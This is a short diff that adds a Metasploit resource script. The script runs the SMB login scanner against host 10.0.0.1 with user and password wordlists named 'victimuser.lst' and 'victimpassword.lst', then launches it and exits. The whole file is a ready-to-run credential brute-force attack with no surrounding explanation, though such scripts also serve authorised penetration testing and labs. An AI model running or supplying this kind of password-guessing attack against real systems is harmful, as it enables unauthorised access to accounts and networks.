@@ -1,0 +1,6 @@
+use auxiliary/scanner/smb/smb_login
+set rhosts 10.0.0.1
+set user_file victimuser.lst
+set pass_file victimpassword.lst
+exploit
+exit
